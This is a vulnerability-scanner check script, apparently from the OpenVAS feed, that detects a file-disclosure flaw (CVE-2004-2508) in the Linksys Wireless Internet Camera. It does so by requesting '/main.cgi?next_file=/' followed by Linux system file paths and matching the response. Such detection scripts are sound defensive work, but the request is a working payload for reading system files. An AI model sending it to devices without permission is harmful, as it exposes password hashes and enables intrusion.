if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.13636" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_cve_id( "CVE-2004-2508" );
	script_bugtraq_id( 10533 );
	script_name( "Linksys Wireless Internet Camera File Disclosure" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2004 Noam Rathaus" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "httpver.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_require_keys( "Host/runs_unixoide" );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "summary", value: "The Linksys Wireless Internet Camera contains a CGI that allows remote
  attackers to disclosue sensitive files stored on the server." );
	script_tag( name: "impact", value: "An attacker may use this CGI to disclosue the password file and from it
  the password used by the root use (the MD5 value)." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
files = traversal_files( "linux" );
for pattern in keys( files ) {
	file = files[pattern];
	url = "/main.cgi?next_file=/" + file;
	req = http_get( item: url, port: port );
	res = http_keepalive_send_recv( port: port, data: req );
	if(isnull( res )){
		exit( 0 );
	}
	if(egrep( pattern: pattern, string: res )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

